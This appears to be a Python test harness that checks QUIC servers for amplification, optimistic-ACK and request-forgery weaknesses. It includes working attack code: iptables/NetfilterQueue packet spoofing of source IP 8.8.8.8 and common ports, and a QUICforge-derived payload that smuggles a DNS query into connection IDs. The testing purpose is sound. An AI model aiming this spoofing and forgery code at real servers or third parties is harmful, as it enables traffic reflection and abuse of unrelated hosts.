import subprocess
import sys
import os
import logging
import json
import shutil
import time
import pyshark
from netfilterqueue import NetfilterQueue
from scapy.all import IP, UDP, Packet
from cleanup import remove_log_files  # Import the function from cleanup.py
import multiprocessing

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Global variable to store results as a string

results_string = ""
address_validation_token = ""
tshark_sniff_command = [
    'tshark', '-i', 'lo', '-f', 'udp port 5555', '-w', './capture.pcap'
]
DNS_server_IP = '8.8.8.8'
port_services = {
    7: "Echo Protocol",
    9: "Discard Protocol",
    11: "Active Users (systat service)",
    13: "Daytime Protocol",
    17: "Quote of the Day (QOTD)",
    18: "Message Send Protocol",
    19: "Character Generator Protocol (CHARGEN)",
    37: "Time Protocol",
    42: "Host Name Server Protocol",
    49: "TACACS Login Host protocol",
    53: "Domain Name System (DNS)",
    67: "Bootstrap Protocol (BOOTP) server / DHCP",
    68: "Bootstrap Protocol (BOOTP) client / DHCP",
    69: "Trivial File Transfer Protocol (TFTP)",
    71: "NETRJS protocol",
    72: "NETRJS protocol",
    73: "NETRJS protocol",
    74: "NETRJS protocol",
    80: "Hypertext Transfer Protocol (HTTP)",
    88: "Kerberos",
    104: "DICOM (Digital Imaging and Communications in Medicine)",
    105: "CCSO Nameserver",
    107: "Remote User Telnet Service (RTelnet)",
    108: "IBM Systems Network Architecture (SNA) gateway access",
    111: "Open Network Computing RPC (ONC RPC / Sun RPC)",
    112: "McIDAS Data Transmission Protocol",
    117: "UUCP Mapping Project (path service)",
    118: "SQL Services",
    123: "Network Time Protocol (NTP)",
    126: "NXEdit (Unisys Programmer's Workbench)",
    135: "DCE endpoint resolution / Microsoft EPMAP",
    137: "NetBIOS Name Service",
    138: "NetBIOS Datagram Service",
    152: "Background File Transfer Program (BFTP)",
    153: "Simple Gateway Monitoring Protocol (SGMP)",
    156: "SQL Service",
    158: "Distributed Mail System Protocol (DMSP)",
    161: "Simple Network Management Protocol (SNMP)",
    162: "SNMP Trap (SNMPTRAP)",
    170: "Network PostScript print server",
    177: "X Display Manager Control Protocol (XDMCP)",
    194: "Internet Relay Chat (IRC)",
    199: "SNMP Unix Multiplexer (SMUX)",
    201: "AppleTalk Routing Maintenance",
    210: "ANSI Z39.50",
    213: "Internetwork Packet Exchange (IPX)",
    218: "Message Posting Protocol (MPP)",
    220: "Internet Message Access Protocol (IMAP) v3",
    259: "Efficient Short Remote Operations (ESRO)",
    262: "Arcisdms",
    264: "Border Gateway Multicast Protocol (BGMP)",
    280: "http-mgmt",
    318: "PKIX Time Stamp Protocol (TSP)",
    319: "Precision Time Protocol (PTP) event messages",
    320: "Precision Time Protocol (PTP) general messages",
    350: "MATIP type A",
    351: "MATIP type B",
    356: "Cloanto Amiga Explorer",
    366: "On-Demand Mail Relay (ODMR)",
    369: "Rpc2portmap",
    370: "codaauth2 / securecast1",
    371: "ClearCase albd",
    376: "Amiga Envoy Network Inquiry Protocol",
    383: "HP Data Alarm Manager",
    384: "Remote Network Server System",
    387: "AURP (AppleTalk Update-based Routing Protocol)",
    399: "DECnet+ (Phase V) over TCP/IP",
    401: "Uninterruptible Power Supply (UPS)",
    427: "Service Location Protocol (SLP)",
    433: "NNTP (Network News Transfer Protocol)",
    434: "Mobile IP Agent",
    443: "HTTPS (Hypertext Transfer Protocol Secure)",
    444: "Simple Network Paging Protocol (SNPP)",
    445: "Microsoft-DS (Active Directory / Windows shares)",
    464: "Kerberos Change/Set password",
    475: "tcpnethaspsrv (Aladdin Hasp services)",
    497: "Retrospect",
    500: "ISAKMP / IKE (Internet Key Exchange)",
    502: "Modbus Protocol",
    504: "Citadel multiservice protocol",
    510: "FirstClass Protocol (FCP)",
    512: "comsat / biff",
    513: "Who",
    514: "Syslog",
    517: "Talk",
    518: "NTalk",
    520: "Routing Information Protocol (RIP)",
    521: "RIPng (Routing Information Protocol Next Generation)",
    524: "NetWare Core Protocol (NCP)",
    525: "Timed (Timeserver)",
    530: "Remote Procedure Call (RPC)",
    533: "netwall (emergency broadcasts)",
    542: "Commerce Applications",
    546: "DHCPv6 client",
    547: "DHCPv6 server",
    550: "new-rwho / new-who",
    554: "Real Time Streaming Protocol (RTSP)",
    560: "rmonitor (Remote Monitor)",
    561: "monitor",
    563: "NNTP over TLS/SSL (NNTPS)",
    593: "HTTP RPC Ep Map",
    623: "ASF-RMCP / IPMI Remote Management Protocol",
    631: "Internet Printing Protocol (IPP)",
    635: "RLZ DBase",
    639: "Multicast Source Discovery Protocol (MSDP)",
    641: "SupportSoft Nexus Remote Command (control)",
    643: "SANity",
    646: "Label Distribution Protocol (LDP)",
    651: "IEEE-MMS",
    653: "SupportSoft Nexus Remote Command (data)",
    655: "Tinc VPN daemon",
    657: "IBM RMC Protocol",
    666: "Doom",
    684: "CORBA IIOP SSL",
    688: "REALM-RUSD",
    690: "Velneo Application Transfer Protocol (VATP)",
    694: "Linux-HA heartbeat",
    698: "Optimized Link State Routing (OLSR)",
    749: "Kerberos administration",
    750: "Kerberos version IV",
    753: "Reverse Routing Header (RRH)",
    754: "tell send",
    800: "mdbs-daemon",
    802: "MODBUS/TCP Security",
    830: "NETCONF over SSH",
    831: "NETCONF over BEEP",
    832: "NETCONF for SOAP over HTTPS",
    833: "NETCONF for SOAP over BEEP",
    848: "Group Domain Of Interpretation (GDOI)",
    853: "DNS over QUIC / DNS over DTLS",
    861: "OWAMP control",
    862: "TWAMP control",
    989: "FTPS (data)",
    990: "FTPS (control)",
    991: "Netnews Administration System (NAS)",
    992: "Telnet over TLS/SSL",
    995: "POP3S (Post Office Protocol 3 over TLS/SSL)"
}
port_services_iterable = iter(port_services.keys())
def append_to_results(result):
    global results_string
    results_string += result + "\n"


# The following variables and function are taken and adapted from from vnrf_payload_dns.py by Yurigbur
# GitHub: https://github.com/yurigbur/QUICforge/blob/main/vnrf_payload_dns.py
def create_payload(host, n_supported_versions):
    SCID_TMPL = b'\x00\x00\x00\x00\x00\x01'
    PAD = b'\x00\x00\x01\x00\x01'
    labels = host.split(".")
    scid = SCID_TMPL + bytes([len(labels[0])])
    dcid_len = ord(labels[0][0])
    dcid = labels[0][1:].encode('utf-8')
    for i in range(1,len(labels)):
        dcid += bytes([len(labels[i])]) + labels[i].encode('utf-8')
    dcid += b'\x00\x00\x01\x00\x01'
    dcid += PAD * 6
    dcid += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    remain_len = (dcid_len - len(dcid) - 1) + (n_supported_versions * 4)
    dcid += bytes([remain_len])
    dcid += os.urandom(dcid_len - len(dcid))
    return dcid,scid


def spoof_packet(packet, iterate_ports=False, ip=DNS_server_IP, port=53):
    """Spoofs the source IP and port of a packet's payload.

    Args:
        packet (Packet): The packet to spoof.
        ip (str): The new source IP address. Default is Google's DNS (8.8.8.8).
        port (int): The new source port. Default is 53 (DNS).

    Returns:
        Packet: The modified packet with spoofed IP and port.
    """
    try:
        # Extract the payload as an IP packet.
        payload = IP(packet.get_payload())

        # Verify the payload contains both IP and UDP layers.
        if not payload.haslayer(IP) or not payload.haslayer(UDP):
            raise ValueError("Packet must contain both IP and UDP layers.")

        # Set spoofed IP and port
        if iterate_ports:
            payload.sport = next(port_services_iterable)
            #payload.src = ip
        else:
            payload.src, payload.sport = ip, port

        # Recalculate checksums for IP and UDP layers.
        del payload[IP].chksum
        del payload[UDP].chksum
        payload = payload.__class__(bytes(payload))

        # Set the new payload in the packet.
        packet.set_payload(bytes(payload))
        packet.accept()
        logging.info(f"Packet accepted by NetfilterQueue")

    except Exception as e:
        logging.error(f"Error spoofing packet: {e}")
        sys.exit(1)


def run_netfilter_queue(queue):
    """Run the NetfilterQueue (blocking call)."""
    try:
        queue.run()  # This will block until stopped.
    except KeyboardInterrupt:
        logging.error("\n[*] NetfilterQueue stopped.")


def backup_files(source_files, backup_files):
    """
    Copies files from source_files to backup_files.

    Parameters:
    - source_files (list): A list of source file paths.
    - backup_files (list): A list of corresponding backup file paths.
    """
    for src, dst in zip(source_files, backup_files):
        if os.path.exists(src):
            # Copy the source file to the destination
            shutil.copy2(src, dst)


def load_qlog_file(directory='./aioquic/log/'):
    qlog_files = [f for f in os.listdir(directory) if f.endswith('.qlog')]
    
    if not qlog_files:
        logging.error("No .qlog file found in the directory.")
        return None
    
    qlog_file = qlog_files[0]
    file_path = os.path.join(directory, qlog_file)
    
    logging.info(f"Loading data from file: {qlog_file}")
    
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        return data
    except json.JSONDecodeError as e:
        logging.error(f"Failed to decode JSON from {file_path}: {e}")
        return None


def find_key(data, key_to_find):
    """
    Recursively search for a key in the JSON structure, and return the value of the key.
    """
    if isinstance(data, dict):
        for key, value in data.items():
            if key == key_to_find:
                return value
            result = find_key(value, key_to_find)
            if result is not None:
                return result
    elif isinstance(data, list):
        for item in data:
            result = find_key(item, key_to_find)
            if result is not None:
                return result
    return None


def find_value(data, value_to_find):
    """
    Recursively search for a value in the JSON structure, and return the key of the value.
    """
    if isinstance(data, dict):
        for key, value in data.items():
            if value == value_to_find:
                return key
            result = find_value(value, value_to_find)
            if result is not None:
                return result
    elif isinstance(data, list):
        for item in data:
            result = find_value(item, value_to_find)
            if result is not None:
                return result
    return None


def search_for_new_token_frame(logs_path='./aioquic/log'):
    global address_validation_token

    if not os.path.exists(logs_path):
        logging.error(f"Logs directory {logs_path} does not exist.")
        return False

    data = load_qlog_file()
    # Search for 'new_token' frame anywhere in the JSON structure
    if find_value(data, 'new_token') is not None:
        token_data = find_key(data, 'token')
        address_validation_token = token_data#.encode('utf-8')  # Convert to bytes
        logging.info(f"New token found: {address_validation_token}")
        return True

    return False


def check_anti_amplification_limit(server, port, client_command):
    """
    Return True if the server doesn't send more than Anti-Amplification limit (with tolerance), and False otherwise.
    """
    # Start tshark in the background
    tshark_process = subprocess.Popen(tshark_sniff_command)
    time.sleep(2)  # Give tshark some time to start up

    logging.info(f"Executing client command: {' '.join(client_command)}")
    subprocess.run(client_command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
    time.sleep(2)  
    # Stop the tshark process after the command completes
    tshark_process.terminate()
    # Wait for tshark to finish writing the capture file
    tshark_process.wait()

    # Read the capture
    capture = pyshark.FileCapture('./capture.pcap')

    first_datagram_sent_length = None
    cumulative_datagram_received_length = 0
    first_datagram_sent_found = False

    # Process each packet
    for packet in capture:
        if 'udp' in packet:
            if packet.udp.srcport == "5555":
                if not first_datagram_sent_found:
                    first_datagram_sent_length = int(packet.udp.length)
                    first_datagram_sent_found = True  # Set flag for first datagram
                else:
                    # Stop processing once the second datagram sent is found
                    break        
            elif packet.udp.dstport == "5555" and first_datagram_sent_found:
                cumulative_datagram_received_length += int(packet.udp.length)
        
    capture.close()
    logging.info(f"Length of first datagram sent: {first_datagram_sent_length}")
    logging.info(f"Cumulative length of datagrams received between first and second datagram sent: {cumulative_datagram_received_length}")
        
    result = f"{server}:{port}\t- Length of first datagram sent: {first_datagram_sent_length}"
    append_to_results(result)
    result = f"{server}:{port}\t- Cumulative length of datagrams received between first and second datagram sent: {cumulative_datagram_received_length}"
    append_to_results(result)
    result = f"{server}:{port}\t- Amplification factor: {cumulative_datagram_received_length/first_datagram_sent_length}"
    append_to_results(result)

    # Check anti-amplification limit with tolerance
    if 4* first_datagram_sent_length > cumulative_datagram_received_length:
        return True
    else:
        return False


def run_test_case_new_token_support(server, port, http3=True):
    logging.info(f"Running test case new_token_support against {server} on port {port}.")
    client_command_h0 = [
        "python3", "aioquic/examples/http3_client.py",
        "--ca-certs", "aioquic/tests/pycacert.pem",
        "--secrets-log", "aioquic/secrets.log",
        "--session-ticket", "aioquic/session",
        "--insecure",
        "--output-dir", "aioquic/output",
        "--quic-log", "aioquic/log",
        "--verbose",
        "--legacy-http",
        "--server-name", "www.example.com",
        "--local-port", "5555",
        f"https://localhost:{str(port)}/test.html"
    ]
    client_command_h3 = [
        "python3", "aioquic/examples/http3_client.py",
        "--ca-certs", "aioquic/tests/pycacert.pem",
        "--secrets-log", "aioquic/secrets.log",
        "--session-ticket", "aioquic/session",
        "--insecure",
        "--output-dir", "aioquic/output",
        "--quic-log", "aioquic/log",
        "--verbose",
        "--server-name", "www.example.com",
        "--local-port", "5555",
        f"https://localhost:{str(port)}/test.html"
    ]
    if http3:
        client_command = client_command_h3
    else:
        client_command = client_command_h0

    remove_log_files()

    try:
        logging.info(f"Executing client command: {' '.join(client_command)}")
        subprocess.run(client_command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        found = search_for_new_token_frame()

        if found:
            result = f"{server}:{port}\t- Server supports NEW_TOKEN frames."
            logging.info("The term 'new_token' was found in the log files. Server supports NEW_TOKEN frames.")
            append_to_results(result)
            return True
        else:
            result = f"{server}:{port}\t- Server doesn't support NEW_TOKEN frames."
            logging.info("The term 'new_token' was not found in the log files. Server doesn't support NEW_TOKEN frames.")
            append_to_results(result)
            return False
        
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to run HTTP/3 client script against {server} on port {port}: {e}")
        logging.info(f"Trying again with HTTP/0.9...")
        return run_test_case_new_token_support(server, port, http3=False)


def run_test_case_anti_amplification_limit(server, port, http3=True):
    """
    Return True if the server doesn't send more than Anti-Amplification limit (with tolerance), and False otherwise.
    """
    global address_validation_token
    logging.info(f"Running test case anti_amplification_limit against {server} on port {port}.")
    client_command_h0 = [
        "python", "aioquic/examples/http3_client.py",
        "--ca-certs", "aioquic/tests/pycacert.pem",
        "--secrets-log", "aioquic/secrets.log",
        "--session-ticket", "aioquic/session",
        "--zero-rtt",
        "--insecure",
        "--output-dir", "aioquic/output",
        "--quic-log", "aioquic/log",
        "--verbose",
        "--legacy-http",
        "--server-name", "www.example.com",
        "--local-port", "5555",
        "--token", address_validation_token,
        f"https://localhost:{str(port)}/test.html"
    ]
    client_command_h3 = [
        "python", "aioquic/examples/http3_client.py",
        "--ca-certs", "aioquic/tests/pycacert.pem",
        "--secrets-log", "aioquic/secrets.log",
        "--session-ticket", "aioquic/session",
        "--zero-rtt",
        "--insecure",
        "--output-dir", "aioquic/output",
        "--quic-log", "aioquic/log",
        "--verbose",
        "--server-name", "www.example.com",
        "--local-port", "5555",
        "--token", address_validation_token,
        f"https://localhost:{str(port)}/test.html"
    ]
    if http3:
        client_command = client_command_h3
    else:
        client_command = client_command_h0

    try:
        ret = check_anti_amplification_limit(server, port, client_command)
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to run HTTP/3 client script against {server} on port {port}: {e}")
        logging.info(f"Trying again with HTTP/0.9...")
        return run_test_case_anti_amplification_limit(server, port, http3=False)

    if ret:
        result = f"{server}:{port}\t- Server doesn't send more data than Anti-Amplification limit (when sending 0-RTT with AVT)."
        append_to_results(result)
        return True
    else:
        result = f"{server}:{port}\t- Server sends more data than the Anti-Amplification limit (when sending 0-RTT with AVT). => susceptible"
        append_to_results(result)
        return False


def run_test_case_sending_AVT_multiple_times(server, port, http3=True):
    logging.info(f"Running test case sending_AVT_multiple_times against {server} on port {port}.")
    client_command_h0 = [
        "python", "aioquic/examples/http3_client.py",
        "--ca-certs", "aioquic/tests/pycacert.pem",
        "--secrets-log", "aioquic/secrets.log",
        "--session-ticket", "aioquic/session_old",
        "--zero-rtt",
        "--insecure",
        "--output-dir", "aioquic/output",
        "--quic-log", "aioquic/log",
        "--verbose",
        "--legacy-http",
        "--server-name", "www.example.com",
        "--local-port", "5555",
        "--token", address_validation_token,
        f"https://localhost:{str(port)}/test.html"
    ]
    client_command_h3 = [
        "python", "aioquic/examples/http3_client.py",
        "--ca-certs", "aioquic/tests/pycacert.pem",
        "--secrets-log", "aioquic/secrets.log",
        "--session-ticket", "aioquic/session_old",
        "--zero-rtt",
        "--insecure",
        "--output-dir", "aioquic/output",
        "--quic-log", "aioquic/log",
        "--verbose",
        "--server-name", "www.example.com",
        "--local-port", "5555",
        "--token", address_validation_token,
        f"https://localhost:{str(port)}/test.html"
    ]
    if http3:
        client_command = client_command_h3
    else:
        client_command = client_command_h0

    try:
        ret = check_anti_amplification_limit(server, port, client_command)
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to run HTTP/3 client script against {server} on port {port}: {e}")
        logging.info(f"Trying again with HTTP/0.9...")
        return run_test_case_sending_AVT_multiple_times(server, port, http3=False)

    if ret:
        result = f"{server}:{port}\t- Server doesn't accept valid Address Validation Tokens multiple times."
    else:
        result = f"{server}:{port}\t- Server accepts valid Address Validation Tokens multiple times. => SUSCEPTIBLE"
        
    append_to_results(result)


def security_consideration_amplification_attack(server, port):
    """
    Run test cases for security consideration Amplification Attack.
    """
    logging.info(f"Running test cases for security consideration 'Amplification attack' against {server} on port {port}.")
    
    if run_test_case_new_token_support(server, port):
        
        # Back up session for run_test_case_sending_AVT_multiple_times() latter
        backup_files(['./aioquic/session'], ['./aioquic/session_old'])
        
        if not run_test_case_anti_amplification_limit(server, port):
            # If server sends more than the Anti-Amplification limit
            run_test_case_sending_AVT_multiple_times(server, port)



def security_consideration_optimistic_ACK_attack(server, port, http3=True):
    """
    Run test cases for security consideration Optimistic ACK Attack.
    """
    logging.info(f"Running test cases for security consideration 'Optimistic ACK Attack' against {server} on port {port}.")
    client_command_h0 = [
        "python3", "aioquic/examples/http3_client.py",
        "--ca-certs", "aioquic/tests/pycacert.pem",
        "--secrets-log", "aioquic/secrets.log",
        "--insecure",
        "--output-dir", "aioquic/output",
        "--quic-log", "aioquic/log",
        "--verbose",
        "--legacy-http",
        "--server-name", "www.example.com",
        "--local-port", "5555",
        f"https://localhost:{str(port)}/largeFile.html"
    ]
    client_command_h3 = [
        "python3", "aioquic/examples/http3_client.py",
        "--ca-certs", "aioquic/tests/pycacert.pem",
        "--secrets-log", "aioquic/secrets.log",
        "--insecure",
        "--output-dir", "aioquic/output",
        "--quic-log", "aioquic/log",
        "--verbose",
        "--server-name", "www.example.com",
        "--local-port", "5555",
        f"https://localhost:{str(port)}/largeFile.html"
    ]
    if http3:
        client_command = client_command_h3
    else:
        client_command = client_command_h0

    # Start tshark in the background
    tshark_process = subprocess.Popen(tshark_sniff_command)
    time.sleep(2)  # Give tshark some time to start up

    try:
        logging.info(f"Executing client command: {' '.join(client_command)}")
        subprocess.run(client_command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
    except subprocess.CalledProcessError as e:
        tshark_process.terminate()
        tshark_process.wait()
        logging.error(f"Failed to run HTTP/3 client script against {server} on port {port}: {e}")
        logging.info(f"Trying again with HTTP/0.9...")
        return security_consideration_optimistic_ACK_attack(server, port, http3=False)
    except subprocess.TimeoutExpired:
        logging.warning(f"The command timed out after 5 seconds")

    time.sleep(2)  
    # Stop the tshark process after the command completes
    tshark_process.terminate()
    # Wait for tshark to finish writing the capture file
    tshark_process.wait()

    # Read the capture
    capture = pyshark.FileCapture('./capture.pcap', display_filter='udp.dstport == 5555')
    
    logging.info(f"Analyzing captured QUIC packets and searching for CONNECTION_CLOSE frame...")

    connection_close_frame_found = False
    expected_packet_number = None
    missing_packet_number = 0
    packet_count = None
    complete_file_received = False
    error_code = None
    reason_phrase = None

    for packet in capture:
        if connection_close_frame_found:
            break
        for layer in packet.layers:
            if layer.layer_name == "quic" and hasattr(layer, 'packet_number'):
                
                current_packet_number = int(layer.packet_number)

                if (expected_packet_number is None) or (current_packet_number < expected_packet_number):
                    logging.info(f"Packet number reset.")
                    missing_packet_number = 0
                    packet_count = 0
                elif (current_packet_number > expected_packet_number):
                    missing_packet_number += current_packet_number - expected_packet_number
                    while (current_packet_number > expected_packet_number):
                        logging.info(f"{expected_packet_number} is missing!!!")
                        expected_packet_number += 1

                expected_packet_number = current_packet_number + 1
                packet_count += 1

#                if (missing_packet_number < 10):
#                    logging.info(f"Expect {expected_packet_number}, received {current_packet_number}") 

                if hasattr(layer, 'stream_fin') and (layer.stream_fin == "True"):
                    complete_file_received = True
                
                # Check if the QUIC layer contains a CONNECTION_CLOSE frame
                if hasattr(layer, 'cc_error_code'):
                    logging.info(f"Found CONNECTION_CLOSE frame in packet {packet.number}")
                    connection_close_frame_found = True
                    error_code = layer.cc_error_code
                    reason_phrase = layer.cc_reason_phrase
                    logging.info(f"Error Code: {error_code}")
                    logging.info(f"Reason Phrase: {reason_phrase}")
                    break  # Exit the loop once the frame is found

    capture.close()
    logging.info(f"Received {packet_count} packets in total. {missing_packet_number} are missing.")
        
    result = f"{server}:{port}\t- Received {packet_count} packets in total."
    append_to_results(result)
    result = f"{server}:{port}\t- {missing_packet_number} packets were skipped (or missed)."
    append_to_results(result)
    result = f"{server}:{port}\t- Complete file received: {complete_file_received}"
    append_to_results(result)
    
    if connection_close_frame_found:
        result = f"{server}:{port}\t- Server terminated the connection upon receiving optimistic ACKs."
        append_to_results(result)
        result = f"{server}:{port}\t- Error code: {error_code}"
        append_to_results(result)
        result = f"{server}:{port}\t- Reason phrase: {reason_phrase}"
        append_to_results(result)
    else:        

        if missing_packet_number > 0:
            if complete_file_received:
                result = f"{server}:{port}\t- Packet numbers were skipped (or missed), but server didn't terminate the connection upon receiving optimistic ACKs. => susceptible"
            else:
                result = f"{server}:{port}\t- Server terminated the connection, but didn't send CONNECTION_CLOSE frame upon receiving optimistic ACKs."
        else:
            result = f"{server}:{port}\t- Server didn't skip any packet number. => susceptible"

        append_to_results(result)



def run_test_case_common_udp_ports_support(server, port):
    logging.info(f"Running test case common_udp_ports_support against {server} on port {port}.")

    client_command = [
        "python3", "aioquic/examples/http3_client.py",
        "--ca-certs", "aioquic/tests/pycacert.pem",
        "--secrets-log", "aioquic/secrets.log",
        "--insecure",
        "--output-dir", "aioquic/output",
        "--quic-log", "aioquic/log",
        "--verbose",
        "--server-name", "www.example.com",
        "--local-port", "5555",
        f"https://localhost:{str(port)}/test.html"
    ]
    global port_services_iterable
    port_services_iterable = iter(port_services.keys())
    
    try:
        logging.info(f"Adding iptables rules to intercept packets...")
        subprocess.run(f"sudo iptables -I OUTPUT -d 127.0.0.1 -p udp --dport {port} -j NFQUEUE --queue-num 1", shell=True, check=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"Couldn't add iptables rules!")
    
    #Initializing netfilter queue
    q = NetfilterQueue()
    #q.bind(1, spoof_packet(iterate_ports=True))
    q.bind(1, lambda packet : spoof_packet(packet, iterate_ports=True))
    queue_process = multiprocessing.Process(target=run_netfilter_queue, args=(q,))
    queue_process.start()
    
    reply_found = False
    for sport, service in port_services.items():        
        if reply_found:
            break
        logging.info(f"Sending Initial packet for spoofed port number {sport}")
        # Start tshark in the background
        tshark_process = subprocess.Popen(['tshark', '-ni', 'any', '-f', f'udp port {sport}', '-w', './capture.pcap'])
        logging.info(f"Tshark started")
        time.sleep(2)  # Give tshark some time to start up

        logging.info(f"Executing client command: {' '.join(client_command)}")
        try:
            subprocess.run(client_command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=0.3)
        except subprocess.CalledProcessError as e:
            logging.info(f"Initial packet sent. Version Negotiation packet might have been received.")
        except subprocess.TimeoutExpired:
            logging.info(f"Initial packet sent. Version Negotiation packet might have been received.")
        
        time.sleep(2)  
        # Stop the tshark process
        tshark_process.terminate()
        logging.info(f"Tshark terminated")
        # Wait for tshark to finish writing the capture file
        tshark_process.wait()
        # Read the capture
        capture = pyshark.FileCapture('./capture.pcap', display_filter=f'udp.dstport == {sport} && !icmp', decode_as = {f'udp.port=={sport}': 'quic'})
        for packet in capture:
            logging.info(f"Response received for spoofed port nunber {sport}.")
            reply_found = True
            result = f"{server}:{port}\t- Response received for spoofed port nunber {sport} ({service}) => QUIC server doesn't block common UDP ports!"
            append_to_results(result)
            capture.close()
            break
    
    try:
        queue_process.join(timeout=1)
        if queue_process.is_alive():
            q.unbind()  # Unbind the queue to stop processing.
            queue_process.terminate()
    except KeyboardInterrupt:
        logging.error("\n[*] Exiting...")
    finally:
        logging.info(f"Removing iptables rules...")
        subprocess.run(f"sudo iptables -D OUTPUT -d 127.0.0.1 -p udp --dport {port} -j NFQUEUE --queue-num 1", shell=True, check=True)


def run_test_case_protocol_impersonation_attack(server, port):
    logging.info(f"Running test case protocol_impersonation_attack against {server} on port {port}.")

    client_command = [
        "python3", "aioquic/examples/http3_client.py",
        "--ca-certs", "aioquic/tests/pycacert.pem",
        "--secrets-log", "aioquic/secrets.log",
        "--insecure",
        "--output-dir", "aioquic/output",
        "--quic-log", "aioquic/log",
        "--verbose",
        "--server-name", "www.example.com",
        "--local-port", "5555",
        f"https://localhost:{str(port)}/test.html"
    ]
    
    logging.info(f"Determining the number of version identifiers in Version Negotiation packet received from {server}")
    n_version_identifiers = 0
    # Start tshark in the background
    tshark_process = subprocess.Popen(tshark_sniff_command)
    logging.info(f"Tshark started")
    time.sleep(2)  # Give tshark some time to start up

    try:
        logging.info(f"Executing client command: {' '.join(client_command)}")
        subprocess.run(client_command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
    except subprocess.CalledProcessError as e:
        logging.error(f"Error: {e}")
    except subprocess.TimeoutExpired:
        logging.info(f"The command timed out after 2 seconds")

    time.sleep(2)  
    # Stop the tshark process
    tshark_process.terminate()
    logging.info(f"Tshark terminated")
    # Wait for tshark to finish writing the capture file
    tshark_process.wait()  
    logging.info(f"Analyzing captured QUIC packets to determine the number of version identifiers in Version Negotiation packet...")

    # Read the capture
    capture = pyshark.FileCapture('./capture.pcap', display_filter='udp.dstport == 5555', decode_as = {'udp.port==5555': 'quic'})
    for packet in capture:
        for layer in packet.layers:
            if layer.layer_name == "quic" and hasattr(layer, 'packet_length'):
                n_version_identifiers = int((int(getattr(layer, 'packet_length')) - 47) / 4)
                logging.info(f"Number of Supported Versions: {n_version_identifiers}")

    capture.close()
    result = f"{server}:{port}\t- QUIC server sent Version Negotiation packet containng {n_version_identifiers} supported versions."
    append_to_results(result)


    logging.info(f"Conducting Protocol Impersonation Attack agasint {server}...")
    init_dcid,init_scid = create_payload("tum.de", n_version_identifiers)
    logging.info(f"Running test cases for security consideration 'Request Forgery Attacks' against {server} on port {port}.")

    client_command = [
        "python3", "aioquic/examples/http3_client.py",
        "--ca-certs", "aioquic/tests/pycacert.pem",
        "--secrets-log", "aioquic/secrets.log",
        "--insecure",
        "--output-dir", "aioquic/output",
        "--quic-log", "aioquic/log",
        "--verbose",
        "--server-name", "www.example.com",
        "--local-port", "5555",
        "--init-dcid", f"{init_dcid.hex()}",
        "--init-scid", f"{init_scid.hex()}",
        f"https://localhost:{str(port)}/test.html"
    ]
    try:
        logging.info(f"Adding iptables rules to intercept packets...")
        subprocess.run(f"sudo iptables -I OUTPUT -d 127.0.0.1 -p udp --dport {port} -j NFQUEUE --queue-num 1", shell=True, check=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"Couldn't add iptables rules!")
    
    #Initializing netfilter queue
    q = NetfilterQueue()
    q.bind(1, spoof_packet)

    # Start tshark in the background
    tshark_process = subprocess.Popen(['tshark', '-ni', 'any', '-f', f'host {DNS_server_IP}', '-w', './capture.pcap'])
    logging.info(f"Tshark started")
    time.sleep(2)  # Give tshark some time to start up

    try:
        logging.info(f"Executing client command: {' '.join(client_command)}")
        subprocess.run(client_command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=0.3)
    except subprocess.CalledProcessError as e:
        logging.error(f"Error: {e}")
    except subprocess.TimeoutExpired:
        logging.info(f"The command timed out after 2 seconds. No response from server. Server might have sent Version Negotiation packet to our spoofed source address.")
    
    queue_process = multiprocessing.Process(target=run_netfilter_queue, args=(q,))
    queue_process.start()

    try:
        queue_process.join(timeout=1)
        if queue_process.is_alive():
            q.unbind()  # Unbind the queue to stop processing.
            queue_process.terminate()
    except KeyboardInterrupt:
        logging.error("\n[*] Exiting...")
    finally:
        logging.info(f"Removing iptables rules...")
        subprocess.run(f"sudo iptables -D OUTPUT -d 127.0.0.1 -p udp --dport {port} -j NFQUEUE --queue-num 1", shell=True, check=True)

    time.sleep(2)  
    # Stop the tshark process
    tshark_process.terminate()
    logging.info(f"Tshark terminated")

    # Wait for tshark to finish writing the capture file
    tshark_process.wait()  

    logging.info(f"Analyzing captured QUIC packets and searching for DNS response...")


    dns_request_found = False # Flag to track if QUIC server sent DNS query for "tum.de"
    dns_response_found = False  # Flag to track if QUIC server received DNS response for "tum.de"

    # Read the capture
    capture = pyshark.FileCapture('./capture.pcap', display_filter='udp.dstport == 53')
    for packet in capture:
        dns_request_found = True
        break

    capture.close()

    if dns_request_found:
        result = f"{server}:{port}\t- QUIC server sent Version Negotiation packet (aka. DNS query) for 'tum.de' to spoofed IP address ({DNS_server_IP}) => susceptible"
    else:
        result = f"{server}:{port}\t- QUIC server didn't send any Version Negotiation packet (DNS query) for 'tum.de' to spoofed IP address ({DNS_server_IP})"
    
    append_to_results(result)

    # Read the capture
    capture = pyshark.FileCapture('./capture.pcap', display_filter='udp.srcport == 53')
    for packet in capture:
        if dns_response_found:
            break
        for layer in packet.layers:
            if layer.layer_name == "dns" and hasattr(layer, 'resp_name') and layer.resp_name == "tum.de":
                logging.info(f"DNS response for 'tum.de' received from DNS server...")
                dns_response_found = True
                break

    capture.close()

    if dns_response_found:
        result = f"{server}:{port}\t- QUIC server received DNS response for 'tum.de' => QUIC server had sent a DNS request as a result of Request Forgery Attack via Version Negotiation => susceptible"
    else:
        result = f"{server}:{port}\t- There's no valid DNS response for 'tum.de'"
        
    append_to_results(result)
    

def security_consideration_request_forgery_attacks(server, port):
    """
    Run test cases for security consideration Request Forgery Attacks.
    """
    run_test_case_common_udp_ports_support(server, port)
    run_test_case_protocol_impersonation_attack(server, port)




def main(server_ports):
    global results_string
    results_string = ""

